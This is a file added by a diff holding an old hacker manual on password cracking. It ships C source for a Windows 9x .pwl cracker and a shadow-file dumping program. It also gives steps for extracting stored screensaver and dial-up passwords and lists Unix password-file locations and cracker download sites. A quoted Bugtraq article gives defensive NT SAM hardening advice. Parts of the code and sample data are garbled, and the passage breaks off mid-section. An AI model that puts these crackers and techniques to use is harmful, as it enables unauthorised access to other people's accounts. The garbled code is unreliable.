@@ -1,0 +1,887 @@
+###########         #                   ###             #########      ##     # 
+ ############       ###                 #####           ###  #####     ###     ## 
+ #####    ####     #####               #######         ###    ###     ####    ### 
+ #####    #####   #######             #########       ###      #      ####  #### 
+  ####   #####    #######            ###########     ###               ### #### 
+   #########      #######           ####     ####    ###               ####### 
+    ###########    #####           #####     #####    ###     ##      ####### 
+   #############    ###   ##      ######  #########    ###   ####     ######### 
+  ######     ####    #   ####      ########  #####      ##  ######     ###   ### 
+ ######     ####     ##########     ####     ####        #########     ###  ##### 
+ #####     ####       ##########     ###     ###          #######     ####  ###### 
+ #############         ##########     ##     ##            #####      ####   #### 
+ ###########            ########      ##     ##             ###        ###    ## 
+
+   #######       #     #        #     # 
+  ##########    ##     ##      ##     ## 
+ ###    ###     ##     ##     ###     ### 
+  ###    #     ###     ###   #####    ####           Black Sun Research Facility 
+    ###         ##     ##    ######   ####             http://blacksun.box.sk 
+      ###       ##     ##    #######  ####                 ASCII By : cyRu5 
+   #   ###     ###     ###   ####  ####### 
+  ###  ####   ####     ####   ###   ##### 
+ ###########   ###########     ##    ### 
+  #########      #######        #     # 
+_____________________________________________________________________________
+
+Password Cracking Decrypted: By Ankit Fadia ankit@bol.net.in
+_____________________________________________________________________________
+
+All of you would probably must have come across the term 'password'. Ever wondered why 
+exactly passwords work and how to crack them? Well, this manual will answer all your queries 
+about passwords and make you an expert in cracking passwords.
+
+Passwords: An Introduction
+
+First of all, what exactly is a password.A password is best described as a verification or an 
+authentication tool or object. Passwords are used to ensure legal and proper access to only those 
+people who have the authority or the permission to view the data.A password is required in many 
+places,you are required a password, to access your Inbox, you are required a password to dial up 
+to your Internet Service Provider and in some organisations you also need to enter a password to 
+start the system.At all places the Username and Password pair is used to authenticate the user.
+Usernames are used to identify the user and the password is used to authenticate the user and 
+for every unique username there is a unique password.Take the example of the Lock and Key, for 
+every lock you need a unique key to open it and enter.Here the Lock acts as the Username and 
+the password would be the key.So passwords are as important as the key of your house.
+
+Your house remains safe as long as only you who is the rightful owner has the key and no one 
+else finds it.Similiarly, the concept behind passwords is that it is only the rightful owner who 
+knows the password and no one else knows it.Everyday we hear about password stealing, 
+computer break ins etc.Sometimes the user chooses very lame passwords which are easily 
+guessed by hackers.There are certain guidelines which I would like to tell you which you must 
+keep in mind while choosing a password:
+
+1. Never keep your password same as your Username
+2. Never choose your own name, Date of Birth, spouse's name, pet's name, child's name etc as 
+your password, those are the first ones which are tried by a hacker.
+3. Some people are so lazy that they keep their password to be 'Enter' (Carriage return)
+4. Try to choose a word which is not in the dictionary and contains both numbers and alphabets, 
+and if possible use both Lower Case and Upper Case alphabets and also symbols like 
+(#,$,%,^ etc) as they can be cracked only be brute force password crackers which take too 
+long a time to crack.
+
+You may say that choosing of weak passwords is responsible for the large number of hacks, but 
+people themselves are the weakest chain in the whole authentication process.Most people 
+usually use lame passwords like those I mentioned above, and those who use excellent 
+passwords are not able to remember them and then write the password down on a piece of paper 
+and stick it on their monitor.One should try his level best to remember weird passwords if he 
+wants to keep his system secure.The best places where you can find the passwords, would be 
+beneath the keyboard, behind the CPU or even on the sides of the monitor.
+Some people have trouble remembering the large number of passwords that they are asked for, 
+while using various services, as a result they use the same password everywhere.Thus knowing 
+even a single password might help in some cases.
+ 
+Password Cracking
+
+The most common method of password cracking is password guessing, although it requires a lot 
+of luck, it can be successful sometimes.To start to guess the password, you first need to gather 
+all kinds of info about the victim.(See the Guidelines of keeping a password for more details.)
+The most common and the most successful method of password cracking is th use of password 
+crackers.Now what exactly are password crackers? Now to understand what a password cracker 
+is and how it works, you first need to understand how a person is authenticated.
+When you are creating a new account or registering or running the setup(basically whenever you 
+create a new account by entering the Username and Password.) you might be asked for the 
+Username and Password.The username is mostly stored in plaintext, but the password that you 
+enter is stored in an encrypted form.Now when you enter the password, it is passed through a pre 
+defined algoritm and is thus encrypted and is stored on the hard disk.So next time when you use 
+the account and enter the password, the text (password) you type is passed through the same 
+algorithm and is compared with the earlier stored value.If they both match, the user is 
+authenticated else the authentication fails.
+The algorithm that is used to encrypt the password is a one way algorithm, by that I mean that if 
+we pass the encrypted password through the reverse algorithm, we will not get the original 
+plaintext password.
+Lets take an example to make it more clear: Say your plaintext password is xyz123 and it is 
+passed through an algorithm and stored in the a file as 0101027AF. Now if you get his encrypted 
+password and know the algorithm which xyz123 is passed through to get 0101027AF, you cannot 
+reverse the algorithm to get xyz123 from 0101027AF.
+When you are typing in your password, the computer does not display it in plaintext but instead 
+shows only stars i.e. ******** so that if someone is shoulder surfing, he cannot find out the 
+password.The text box has been programmed in such a way.On most forms Unix you will not 
+even see the asterix marks and the cursor will not move, so that neither does a person shoulder 
+surfing, find out the password nor does he find out the length of the password.
+
+Password Crackers are of two types-: Brute Force and Dictionary Based. 
+Dictionary Based password Crackers try out all passwords from a given pre defined dictionary list 
+to crack a password.These are faster but more often than not are unsuccessful and do not return 
+the password.As they do not try out all combinations of possible keys, they are unable to crack 
+those passwords which have symbols or numbers in between.
+Brute Force Password Crackers try out all combinations of all keys which can be found in the 
+keyboard (i.e. Symbols, Numbers, Alphabets) both Lower Case and Upper Case.These kinds of 
+Password Crackers have a greater success rate but take a long time to crack the password.As 
+they take all possible keys into consideration, they are more effective.
+Now that you know the two main types of password crackers lets see how they work.
+As passwords are encrypted by a one way algorithm, password crackers do not extract the 
+password from the file but instead take the combination of letters, encrypt them by passing the 
+characters through the original algorithm and compare this value with the stored encrypted 
+value.If these two match, then the password cracker displays the password in plaintext.
+
+Cracking The Windows Login Password
+
+The Windows ( 9x) password is passed through a very weak algorithm and is quite easy to crack.
+Windows stores this login password in *.pwl files in the c:\windows directory.The .pwl files have 
+the filename which is the username coresponding to the password stored by it.A typical .pwl file 
+would be as follows:
+Note: This .pwl file has been taken from a Win98 machine running IE 5.0
+
+###############CUT HERE##############
+
+ã‚…–                                                                                                                                                                                                                                                                     
+ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
+ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿ
+ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿR   
+                                                                      
+p u.ĞX+|rĞq”±/2³ Êå¡hCJ‚D  ×  `ÍY¥!íx}(qW¤ãÆ±<!?àÜ6šá˜ôæ
+4+\¾õ+%E°ËÔımÇÔ ŞI»‚ B à×œøĞ…'@
+
+############CUT HERE#############
+
+Lets go through the contents of this .pwl file.I am not sure what the first line signifies, but my 
+guess would be that it is the Name to which the computer is registered to.The next four lines have 
+just been entered by Windows and are not readable.The last two lines is the password but in the 
+encrypted form.There is no way to get the plaintext password by just studying the Windows 
+algorithm and these lines.To actually crack the password you need a simple but kewl cracker 
+coded in C called Glide.I have included the code below.If you have a sound C knowledge you can 
+study the code and actually experience how a password cracker works and how a password is 
+encrypted in Windows i.e. more about the Windows encryption algorithm.
+
+*********************
+Newbie Tip: All exploits, crackers, mail bombers practically everything related with Hacking has 
+been written in either Perl or C. If you really want to be considered an elitte hacker, you have to 
+know how to program, without a sound knowledge of either C (C++) or Perl you cannot hack 
+successfully.Almost all exploits available on the net have an important part edited or missing, 
+without which it has no use.Some exploits may be needed to be edited in order to be run in your 
+platform.In order to do all this programming is needed.
+********************
+
+
+#include <stdio.h>
+#include <string.h>
+#include <process.h>
+#include <stdlib.h>
+#include <ctype.h>
+#include <conio.h>
+
+unsigned char huge Data[100001];
+unsigned char keystream[1001];
+int Rpoint[300];
+
+void main (int argc,char *argv[]) {
+	FILE *fd;
+	int 	i,j,k;
+	int	size;
+	char ch;
+	char *name;
+	int cracked;
+	int sizemask;
+	int maxr;
+	int rsz;
+	int pos;
+	int Rall[300]; /* recource allocation table */
+
+
+	if (argc<2) {
+		printf("usage: glide filename (username)");
+		exit(1);
+	}
+
+	/* read PWL file */
+
+	fd=fopen(argv[1],"rb");
+	if(fd==NULL) {
+		printf("can't open file %s",argv[1]);
+		exit(1);
+	}
+	size=0;
+	while(!feof(fd)) {
+		Data[size++]=fgetc(fd);
+	}
+	size--;
+	fclose(fd);
+
+	/* find username */
+	name=argv[1];
+	if(argc>2) name=argv[2];
+	printf("Username: %s\n",name);
+
+	/* copy encrypted text into keystream */
+	cracked=size-0x0208;
+	if(cracked<0) cracked=0;
+	if(cracked>1000) cracked=1000;
+	memcpy(keystream,Data+0x208,cracked );
+
+	/* generate 20 bytes of keystream */
+	for(i=0;i<20;i++) {
+		ch=toupper(name[i]);
+		if(ch==0) break;
+		if(ch=='.') break;
+		keystream[i]^=ch;
+	};
+	cracked=20;
+
+
+	/* find allocated recources */
+
+	sizemask=keystream[0]+(keystream[1]<<8);
+	printf("Sizemask: %04X\n",sizemask);
+
+	for(i=0;i<256;i++) Rall[i]=0;
+
+	maxr=0;
+	for(i=0x108;i<0x208;i++) {
+		if(Data[i]!=0xff) {
+			Rall[Data[i]]++;
+			if (Data[i]>maxr) maxr=Data[i];
+		}
+	}
+	maxr=(((maxr/16)+1)*16);	/* recource pointer table size appears to be divisable by 
+16 */
+
+	/* search after recources */
+
+	Rpoint[0]=0x0208+2*maxr+20+2;	/* first recource */
+	for(i=0;i<maxr;i++) {
+		/* find size of current recource */
+		pos=Rpoint[i];
+		rsz=Data[pos]+(Data[pos+1]<<8);
+		rsz^=sizemask;
+		printf("Analyzing block with size: %04x\t(%d:%d)\n",rsz,i,Rall[i]);
+		if( (Rall[i]==0) && (rsz!=0) ) {
+			printf("unused resource has nonzero size !!!\n");
+			printf("If last line produced any : You may try to recover\n");
+			printf("press y to attempt recovery\n");
+			ch=getch();
+			if(ch!='y') exit(0);
+			rsz=2;
+			i-=1;
+		}
+
+		pos+=rsz;
+
+		/* Resources have a tendency to have the wrong size for some reason */
+		/* check for correct size */
+
+		if(i<maxr-1) {
+			while(Data[pos+3]!=keystream[1]) {
+				printf(":",Data[pos+3]);
+				pos+=2; /* very rude may fail */
+			}
+		}
+
+		pos+=2;	/* include pointer in size */
+		Rpoint[i+1]=pos;
+	}
+	Rpoint[maxr]=size;
+
+	/* insert Table data into keystream */
+	for(i=0;i <= maxr;i++) {
+		keystream[20+2*i]^=Rpoint[i] & 0x00ff;
+		keystream[21+2*i]^=(Rpoint[i] >> 8) & 0x00ff;
+	}
+	cracked+=maxr*2+2;
+
+	printf("%d bytes of keystream recovered\n",cracked);
+
+	/* decrypt resources */
+	for(i=0;i < maxr;i++) {
+		rsz=Rpoint[i+1]-Rpoint[i];
+		if (rsz>cracked) rsz=cracked;
+		printf("Recource[%d] (%d)\n",i,rsz);
+		for(j=0;j<rsz;j++) printf("%c",Data[Rpoint[i]+j]^keystream[j]);
+		printf("\n");
+	}
+
+
+	exit(0);
+}
+
+
+Windows Screen Saver Password
+
+This is an interesting hack and not many people know about it.This requires no canned hacking 
+tool, we will crack the password manually!!! First of all, why do we need to crack the Windows 
+Screen Saver? How does it restrict us? If a Screen Saver is password protected, then whenever it 
+is turned on, then in order to turn it off, you need to enter a password.It does not allow us to do 
+anything on a system until and unless we enter the password. We will keep seeing the screen 
+saver until we authenticate ourselves by entering the password.No not even CTRL+ALT+DEL 
+works in this case. Windows stores the Screen Saver password in the user.dat file in the 
+Windows directory.If you have multiple profiles on your system then it is stored in the user.dat file 
+in the c:\windows\profiles\username directory.(On Win 3x systems it is stored in the control.ini file
+The user.dat file constitues the registry of the Windows system, thus we can say that the 
+Windows Screen Saver Password is stored in the registry.
+First of all, you need to change the attributes of this file and make it editable by right clicking on it 
+and unselecting the Read Only Option else you will not be able to edit it.
+Once this is done, open this file in WordPad (Any text editor will do except MS WORD And 
+Notepad.)Now look for the string: ScreenSave_Data  
+You will find an even number of characters after Data, this is the Screen Saver Password 
+encrypted and stored in the hex system.Each pair or hex values represent a single ASCII 
+plaintext character.This means that if there are 10 hex values then the password is of 5 
+characters, each pair of Hex values standing for a single plaintext ASCII character.So in order to 
+get the Plaintext password you just need to decrypt these hex values into ASCII.
+
+Internet Dial Up Password
+
+Have you ever wondered where Windows stores the Internet Connection Password when you 
+have enabled the 'Save Password' option in the 'Connect To' dialog box of the dial up connection.
+Well this password is stored in the registry in the following registry key:
+
+HKEY_CURRENT_USER\RemoteAccess\Profile\<connection name>
+
+If you view the above key in the registry Editor then it probably will not appear understandable. If 
+you want to be able to understand the contents of this key and hence be able to edit this key,then 
+you will have to export this particular key and view it in Notepad.The password is stored in stored 
+as binary values and has to be converted into plantext ASCII before you are able to read it.
+
+Windows NT Password
+
+You have already seen how lame Windows 9x password encrypting algorithm is and how easy it 
+is to overide the Windows Login Password prompt in Win9x systems, well NT is a different 
+story.First of all lets see how the password is stored in NT….firstly the password is not encrypted, 
+it is hashed using the RSA hash function and then this hashed version is passed through am 
+algorithm to obscure it, once onscured,it is stored in the NT registry.Alongwith a stonger 
+password storing tecnique it all ships with various utilities which make it more secure….Service 
+Pack 2 ships with a dll which allows the system adminstrators to ensure that the Passwords used 
+by the users are strong or good enough.The User Manager can be configured to ensure that the 
+user passwords satisfy a particular condition, For example, it can check if the Users are using a 
+password of minimum length.
+If you really want to learn all about NT security, you should read the NTBugtraq archives and join 
+their mailing list.The NTBugtraq Archive is the most comprehensive and exaustive collection of 
+NT Security info.Visit them at www.ntbugtraq.com
+The site has everything that you would want to know about NT including the algorithm used to 
+obscure the hased password.There are various ways of getting administrator previledges in NT, I 
+am not mentioning all of them but have mentioned my favourite….Sam Attacks.If you want to 
+learn about all the ways of breaking into NT, then I recommend you to read the BugTraq 
+Arvhives.I would also be writing a Manual on Hacking NT quite Soon.
+__________________________
+Sam Attacks
+
+The following article has been taken from the Bugtraq Archive. 
+Written by Russ Cooper - 7/22/1998 10:57:34 AM
+
+In the interest of avoiding confusion, I have corrected some mis-use of encryption terminology in 
+the document. In addition, some additions have been made to both recommendations. Future 
+updates will be kept on http://ntbugtraq.ntadvice.com/default.asp?sid=1&pid=47&aid=15 and the 
+list will only be notified in the event of major changes.
+
+
+Recently, the algorithm for reversing the obfuscation (obscuring) step of hashing an NT user ID's 
+password was published. This has resulted in a great deal of discussion over the relative security 
+of Windows NT systems. This article intends on providing you, the NT Administrator, with 
+sufficient information and understanding to ensure you are able to DETECT an attempt to exploit 
+your systems using this algorithm.
+
+Q: What's this all about?
+
+A: When a password is stored on Windows NT, it is stored in hashed [not encrypted] form. The 
+clear-text password is first hashed using the RSA MD4 hash function, it is then obscured again 
+using an algorithm (which has now been published). Once obscured, it is stored within the NT 
+registry. The hashed MD4 version of the password (generally accepted as not reversible to clear-
+text) can be used to create a valid challenge response for its user ID. Therefore, should access to 
+this value be obtained, it would be possible to connect to an NT resource authenticating as that 
+user ID despite not having the clear-text password for that user. Since the method of removing 
+the obfuscation step has now been published, and since its possible to view the keys which store 
+the hashed passwords, its possible that this could be done.
+
+Q: But someone must compromise the Administrator accout first, right?
+
+A: Yes, but...as Les Landau quickly pointed out, the entire Security Access Manager (SAM) 
+database is backed up whenever the Emergency Repair Disk (ERD) is updated. Since updating 
+the ERD is good practice, its likely that your SAM has been backed up. By default, the backed up 
+SAM is stored in the file %systemroot%\repair\sam._ , and this directory, by default, allows the 
+group EVERYONE read access. It would be possible to retrieve the hashed passwords from this 
+file rather than from the live registry. The live registry requires Administrator, Administrator Group, 
+or Backup Operator priviledge in order to access the password keys. The backed up SAM in the 
+\repair directory does not. It is considered good practice to not give unrestricted access to the root 
+directory of your %systemroot% drive, as a precaution against having your system files 
+manipulated. By default these directories are not available over the network by anyone other than 
+the Administrator, members of the Administrators group, or the Backup Operator, so this only 
+becomes a risk if you allow other users access either by allowing them to log on at the machine 
+itself (log on locally) or by you creating a share at the root of your system drive granting others 
+permission. Neither of these scenarios are recommended in the interest of security. See 
+Recommendation #1 below for details on how to secure this file.
+
+Q: Ok, so once I've protected the SAM._ file, then the only other way my machine can be 
+exploited is by fooling the Administrator, right?
+
+A: The Administrator, members of the Administrators Group, the Backup Operator, and anyone 
+who has been granted the privilege to backup and restore files, all have the ability to access this 
+information. Furthermore, anyone who can start the Scheduler Service also has the ability to view 
+these entries (this will be explained in detail below). It should be noted, however, that nobody 
+other than the Administrator or members of the Administrators group has the ability to submit a 
+Schedule job. While it is possible for an Administrator to grant this ability to the Server Operators 
+group, this is strongly discouraged. Finally, despite the amount of discussion that has been held 
+on the topic, there is still a community of people who do not appreciate the threat of the Trojan 
+program. Fooling the Administrator is becoming easier as the web interface technology evolves. 
+Double-clicking may not be necessary to execute an application, and its possible for some 
+applications to launch themselves if reckless acceptance of Authenticode certificates has taken 
+place. Administrators may be logging into user's workstations, and if that workstation has not had 
+security controls in place, it's possible that the owner has put programs in the "All Users" Startup 
+group, thereby making them execute as the Administrator when he/she logs on to the 
+workstation.
+
+As Microsoft have already said, it cannot be emphasized enough that the use of the Administrator 
+user ID should be strictly controlled and minimized in every way possible. So to the Backup 
+Operator account. Users who have been made members of the Administrators group should 
+similarily be tightly controlled. The most common reason for these types of permissions is a lack 
+of effort to properly configure user IDs which can access the necessary resources as something 
+other than members of the Administrators group. As these accounts have virtually limitless 
+abilties (since that is their purpose and design), their use must be controlled.
+
+Q: Ok, but what if I want to have users of the Administrators group be able to use those 
+accounts for their everyday work?
+
+A: Obviously this is a common situation in NT environments today. You should change it. If you 
+are willing to accept the risks that are associated with having such powerful accounts using 
+untrusted programs, you can rely on auditing to alert you to attempts to exploit your systems. 
+Unfortunately, due to your acceptance of the risks, you may not be able to prevent the exploits, 
+but you will be able to find out that they have taken place. Auditing, by default, is not turned on in 
+Windows NT. In order to record security events as they occur, you have to enable it. Below you 
+will find detailed instructions on how to establish security auditing, and in particular, how to audit 
+access to the sensitive areas containing the passwords. However, just auditing is not enough. 
+Once enabled, you also have to review the event logs regularily and be able to understand what 
+those events mean. In addition, it should be understood that audit events are recorded on the 
+machine at which they occur, they are not distributed throughout a domain. So if you have a 
+Backup Domain Controller in Toronto, and your Primary Domain Controller is in Lindsay, you will 
+need to collect the event logs from both locations and review them to determine if your passwords 
+have been violated. Either of these machines could be attacked and pose an equal risk, but only 
+the machine which is attacked will record the security audit event. There are a variety of 
+programs available for NT which can do event monitoring, collection, and alert notification. If you 
+are seriously interested in such a tool, contact me privately and I'll give you a list of currently 
+available products. Unfortunately none of them are inexpensive, but their costs pale in 
+comparison to the cost of trying to do this event work in a large scale environment manually.
+
+
+RECOMMENDATION #1 - How to secure the %systemroot%\repair\sam._ file
+
+By default, the SAM._ file and \repair directory has the following permissions;
+
+Administrators: Full Control 
+Everyone: Read 
+SYSTEM: Full Control 
+Power Users: Change 
+1. From within Explorer, highlight the SAM._ file, right click, choose properties, security, 
+permissions. Remove all privilege from this file.
+
+
+2. From a DOS prompt, execute the following;
+
+cacls %systemroot%\repair\sam._ /D Everyone
+
+This will deny the group Everyone permission to the file, ensuring that no other 
+permission (i.e. inheritted permissions from a share) can override the file permission.
+
+
+3. Whenever you need to update your ERD, first execute the following from a DOS prompt;
+
+cacls %systemroot%\repair\sam._ /T /G Administrators:C
+
+This will grant Administrators change permission to update it during the ERD update.
+
+
+4. Once the ERD has been updated, execute the following from a DOS prompt;
+
+cacls %systemroot%\repair\sam._ /E /R Administrators
+
+This will once again remove the permissions for Administrator.
+
+
+RECOMMENDATION #2 - How to enable auditing on password registry keys 
+1. First you have to make sure auditing is enabled. Start User Manager, Policies, Audit, and 
+click "Audit These Events".
+
+
+2. By default, Windows NT does not identify any users or groups to audit on any objects 
+within the system. Auditing can add performance overhead to your system depending on 
+the available resources, so care should be taken in determining what and whom to audit. 
+For a full description of auditing in Windows NT, I recommend the Microsoft Press book 
+"Windows NT 3.5 - Guidelines for Security, Audit, and Control", ISBN 1-55615-814-9. 
+Despite its title it is still the most comprehensive coverage of auditing that I have read. 
+For the sake of this example, we will simply check every Success and Failure checkbox.
+
+
+3. Close the dialog.
+
+
+4. Now for a little known trick. While logged on as Administrator, ensure that the Schedule 
+service is set to start up as the System account. Once set, start the Schedule service.
+
+
+5. Check the time, and then open a DOS prompt. At the DOS prompt, type in the following; 
+at 22:48 /interactive "regedt32.exe" where 22:48 gets replaced with the current time plus 
+1 minute (or 2 or whatever amount of time you think it will take you to type in the 
+command).
+
+
+6. At the designated time, regedt32.exe will fire up and appear on your desktop. This 
+incarnation of regedt32.exe will be running in the security context of the user SYSTEM. 
+As such, you will be able to see the entire registry, every key within the SAM or Security 
+trees. BE VERY CAREFUL HERE. It is important to note that when running an applicatin 
+as SYSTEM, it does so attempting to use null session for credentials. Null session 
+support has been disabled by default in all versions of Windows NT after 3.1, therefore 
+any attempt to connect to non-local resources as this security context will fail. An 
+Administrator could enable null session support through the registry, but such a 
+configuration is strongly discouraged.
+
+
+7. All we want to do is enable auditing on the designated keys, nothing else. To this end, we 
+highlight the HKEY_LOCAL_MACHINE windows within regedt32. Next highlight the SAM 
+tree. Choose the Security menu item, then Auditing. 
+
+
+8. Click on the Add button and choose Show Users.
+
+
+9. I'm going to recommend that you add the SYSTEM user, the group Domain Admins, and 
+the user Administrator. You want to cover any account which has the right to;
+"Take ownership of files or other objects"
+"Back up files and directories"
+"Manage auditing and security log"
+"Restore files and directories"
+"Add workstations to domain"
+"Replace a process level token"
+
+
+10. Click the Audit Permission on Existing Subkeys 
+
+
+11. Next, click in the Success and Failure checkboxes for the following entries;
+- Query Value
+- Set Value
+- Write DAC
+- Read Control
+
+
+12. Choose OK, and then Yes.
+
+
+13. Repeat the process for the Security tree.
+
+
+14. Close REGEDT32, and stop the Schedule service. You will want to set the Schedule 
+service to use a userID for startup which you create, rather than SYSTEM, in future. Take 
+this opportunity to create such a user and change the startup for Schedule.
+
+You will now have applied auditing to the entire SAM ensuring you'll be notified via the Event 
+Logger of any failed or successful access to your sensitive information by the only accounts 
+which have the ability to access such information. The issue of what to do when/if you discover 
+event notifications is beyond the scope of this document. Part of a good security policy is an 
+appropriate audit policy which would dictate how the event logs are reviewed, how the information 
+is verified, and what actions should be taken for each possible event. Refer to the book I've 
+recommended above for information on how to establish such a policy, or contact a consultant 
+capable of defining and implementing such a policy within your organization (not me, my plate's 
+full thanks).
+______________________________________
+
+L0phtCrack is a NT password cracker which can get NT passwords using both dictionary based 
+and brute force attacks.It can also be run on lower priority so that it can work in the background, 
+while NT is running.
+
+
+Cracking Unix Password Files
+
+Unix is considered to be the most secure OS.The method used to store passwords is definitely 
+more safe and secure in Unix systems.In most Unix systems you will find that the passwords are 
+stored in file called 'passwd' which is located at /etc/passwd.The password file has many lines of 
+the following basic structure:
+
+ankit:RqX6dqOZsf4BI:2:3:Ankit Fadia:/home/ankit:/bin/bash 
+
+The above line can be broken and arraged as follows:
+
+Username: ankit
+Encrypted Password: RqX6dqOZsf4BI
+User number: 2
+Group Number: 3 
+Actual Name: Ankit Fadia
+Home Directory: /home/ankit 
+Type of Shell: /bin/bash 
+
+As the encryption algorithm is one way you cannot decrypt the password but need to use a  
+password cracker which will crack the password for you.
+The example line of the passwd file that I gave was a line taken from a unshadowed password 
+file.Now sometimes you may find that instead of the above line you may find something like the 
+below:
+
+ankit:*:2:3:Ankit Fadia:/home/ankit:/bin/bash
+
+The above line has been taken from a shadowed password file.In a shadowed password file what 
+happens is that the password field is replaced by a ' * ' (The ' * ' is called a token.)such that the 
+encrypted password does not show up in the password file and the list of encrypted passwords is 
+stored in a different file which is not readable by normal users.
+
+***************
+Hacking Tip: The ' * ' that replaces the passwords in shadowed password files is called a token 
+and on some systems it is also ' $ ' or ' # ' or even same as the Username.
+***************
+So first of all to start cracking the password file you need to unshadow the passwords.You can 
+unshadow the passwords by running the following C program that I picked up somewhere.
+
+struct  SHADOWPW {     /* see getpwent(3) */                                  char *pw_name; 
+     char *pw_passwd; 
+int  pw_uid;                                                          
+
+     int  pw_gid; 
+     int  pw_quota; 
+
+     char *pw_comment;                                                      
+
+     char *pw_gecos; 
+     char *pw_dir; 
+char *pw_shell;                                                        
+   };                                                                       
+   struct passwd *getpwent(), *getpwuid(), *getpwnam();
+   #ifdef   elxsis? 
+
+   /* Name of the shadow password file. Contains password and aging info *  
+                                                                            
+   #define  SHADOWPW "/etc/shadowpw"                                        
+   #define  SHADOWPW_PAG "/etc/shadowpw.pag"                                
+   #define  SHADOWPW_DIR "/etc/shadowpw.dir"                                
+   /*                                                                       
+    *  Shadow password file pwd->pw_gecos field contains:                   
+    *                                                                       
+    *  <type>,<period>,<last_time>,<old_time>,<old_password>                
+    *                                                                       
+    *  <type>  = Type of password criteria to enforce (type int).           
+    *  BSD_CRIT (0), normal BSD.                                            
+    *  STR_CRIT (1), strong passwords.                                      
+    *  <period>  = Password aging period (type long).                       
+    *  0, no aging.                                                         
+    *  else, number of seconds in aging period.                             
+    *  <last_time>	 = Time (seconds from epoch) of the last password        
+    *  change (type long).                                                  
+    *  0, never changed.n                                                 
+    *  <old_time>  = Time (seconds from epoch) that the current password    
+    *  was made the <old_password> (type long).                             
+    *  0, never changed.ewromsinm                                           
+    *  <old_password> = Password (encrypted) saved for an aging <period> t  
+    *  prevent reuse during that period (type char [20]).                   
+    *  "*******", no <old_password>.                                        
+    */                                                                      
+                                                                            
+   /* number of tries to change an aged password */                         
+                                                                            
+   #define  CHANGE_TRIES 3                                                  
+                                                                            
+   /* program to execute to change passwords */                             
+                                                                            
+   #define  PASSWD_PROG "/bin/passwd"                                       
+                                                                            
+   /* Name of the password aging exempt user names and max number of entir        
+                                                                            
+   #define  EXEMPTPW "/etc/exemptpw"                                        
+   #define MAX_EXEMPT 100                                                   
+                                                                            
+                                                                            
+   /* Password criteria to enforce */                                       
+                                                                            
+   #define BSD_CRIT 0 /* Normal BSD password criteria */                    
+   #define STR_CRIT 1  /* Strong password criteria */                       
+   #define MAX_CRIT 1                                                       
+   #endif   elxsi                                                           
+   #define NULL 0                                                           
+   main()                                                                   
+   {                                                                        
+   struct passwd *p;                                                        
+  int i; 
+   for (;1;) {;                                                             
+    p=getpwent();
+     if (p==NULL) return; 
+     printpw(p);                                                          
+   }                                                                        
+   }  
+                                                                                                                                             
+   printpw(a)                                                               
+   struct SHADOWPW *a;                                                      
+   {    
+                                                                    
+   printf("%s:%s:%d:%d:%s:%s:%s\n",                                         
+      a->pw_name,a->pw_passwd,a->pw_uid,a->pw_gid,                          
+      a->pw_gecos,a->pw_dir,a->pw_shell);                                   
+   }                                                                        
+
+Now once the password file has been unshadowed you can use either Jack The Ripper or 
+Cracker Jack to crack the passwords.Cracker Jack is a DOS based Unix password file cracker 
+which can perform only dictionary based cracking.Do make sure that the password file that you 
+are trying to crack is unshadowed as these crackers cannot crack shadowed password files.
+You also need an exaustive Dictionary List  or a Wordlist.The more comprehensive the wordlist 
+the more is your chance to be able to crack the password file.You can get both these crackers 
+from a lot of places:
+
+http://astalavista.box.sk
+http://www.anticode.com
+http://www.hackersclub.com
+
+********************
+Hacking Tip: Want to find out where the password file is stred in your version of Unix?
+Well to find out your Unix Version type the following command:
+uname -a         
+
+The following are the paths where Password files are stored in various Unix versions:                                                     
+                                                                                        
+        UNIX Paths (Courtesy of 2600)                                                   
+                                                                                        
+        UNIX                  Path                                              Token                     
+        ----------------------------------------------------------------------------               
+        AIX 3                 /etc/security/passwd                          !                         
+               or             /tcb/auth/files/<first letter                     #                         
+                                of username>/<username>                             
+        A/UX 3.0s             /tcb/files/auth/?/*                                       
+        BSD4.3-Reno           /etc/master.passwd                   *                         
+        ConvexOS 10           /etc/shadpw                               *                         
+        ConvexOS 11           /etc/shadow                               *                         
+        DG/UX                 /etc/tcb/aa/user/                             *                         
+        EP/IX                 /etc/shadow                                      x                         
+        HP-UX                 /.secure/etc/passwd                        *                         
+        IRIX 5                /etc/shadow                                      x                         
+        Linux 1.1             /etc/shadow                                     *                         
+        OSF/1                 /etc/passwd[.dir|.pag]                      *                         
+        SCO Unix #.2.x        /tcb/auth/files/<first letter            *                         
+                                     of username>/<username>                            
+        SunOS4.1+c2           /etc/security/passwd.adjunct    ##username                
+        SunOS 5.0             /etc/shadow                                               
+                              <optional NIS+ private secure maps/tables/whatever        
+        System V Release 4.0  /etc/shadow                          x                         
+        System V Release 4.2  /etc/security/* database                                  
+        Ultrix 4              /etc/auth[.dir|.pag]                             *                         
+        UNICOS                /etc/udb                                        *                         
+                                                                                        
+***************************
+
+I have explained to you how to crack a Unix password file, but the most difficult part is getting the 
+Unix Password file.You first need to find a hole in the services running at various ports of the 
+host. There are many C program that you may find on the net which will promise to get you root 
+or to get you out of the restricted shell etc. But I assure you that almost all of these ready made C 
+programs have a tiny little part either missing or edited. A huge Sendmail Exploit that was 
+publised on the web had the most important line commented and hence the exploit did not work.
+I again emphasize the need to learn to program.Programming is very very important not only in 
+debuging already found exploits but also to discover new holes in popular daemons.To find a hole 
+say in Sendmail you need to go through the it's code over and over again and look for that tiny bit 
+that is exploitable.So the bottomline is that one must know how to program to do anything in 
+Hacking.
+
+HTTP Basic Authentication 
+
+The most common methods of authentication used by web sites are either CGI Based or 
+JavaScript based.Another type of authentication which is slowly becoming popular is the HTTP 
+Basic authentication.
+You must have almost certainly come across password protected websites which pop up a dialog 
